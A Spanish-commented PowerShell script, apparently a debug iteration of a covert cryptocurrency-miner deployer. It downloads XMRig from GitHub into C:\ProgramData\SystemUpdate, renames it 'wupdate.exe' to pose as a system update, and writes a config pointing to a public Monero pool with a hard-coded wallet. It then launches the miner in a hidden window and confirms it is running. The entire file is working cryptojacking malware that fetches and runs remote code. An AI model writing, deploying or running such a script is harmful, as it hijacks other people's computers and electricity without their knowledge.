# === DEPLOY XMRig DEBUG v8 - Corrección del bug config.json ===
$installPath = "C:\ProgramData\SystemUpdate"
$debugLog = "$installPath\deploy-debug.log"

function Write-DebugLog {
    param([string]$message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp | $message" | Add-Content -Path $debugLog -Encoding UTF8 -Force
    Write-Host "$timestamp | $message"
}

Write-DebugLog "=== INICIO DEBUG v8 ==="
Write-DebugLog "Usuario: $(whoami)"

New-Item -ItemType Directory -Path $installPath -Force | Out-Null

# Descarga y extracción (igual que antes)
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force
Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force

Write-DebugLog "wupdate.exe creado correctamente"

# === CREACIÓN DEL CONFIG CON MÉTODO MÁS FIABLE ===
$configPath = "$installPath\config.json"

$configJson = @'
{
    "autosave": true,
    "cpu": {
        "max-threads-hint": 50
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ],
    "background": false,
    "log-file": null
}
'@

# Escribimos el config de forma muy agresiva para evitar problemas de encoding
[System.IO.File]::WriteAllText($configPath, $configJson, [System.Text.Encoding]::UTF8)

Write-DebugLog "config.json escrito con WriteAllText (UTF8)"

# TEST fuerte del config
if (Test-Path $configPath) {
    $size = (Get-Item $configPath).Length
    $firstLine = Get-Content $configPath -First 1
    Write-DebugLog "TEST OK: config existe | Tamaño: $size bytes | Primera línea: $firstLine"
} else {
    Write-DebugLog "ERROR: config.json sigue sin existir después de WriteAllText"
}

# === LANZAMIENTO CON TODOS LOS TRUCOS ===
$exePath = "$installPath\wupdate.exe"

Write-DebugLog "Intentando lanzar minero con WorkingDirectory..."

Start-Process -FilePath $exePath `
    -WorkingDirectory $installPath `
    -ArgumentList "-B -c config.json" `
    -WindowStyle Hidden

Write-DebugLog "Start-Process ejecutado"

Start-Sleep -Seconds 10

$proc = Get-Process wupdate -ErrorAction SilentlyContinue
if ($proc) {
    Write-DebugLog "ÉXITO FINAL: wupdate.exe está corriendo (PID $($proc.Id))"
} else {
    Write-DebugLog "FALLÓ: No se detecta wupdate.exe después de 10 segundos"
}

Write-DebugLog "=== FIN DEBUG v8 ==="
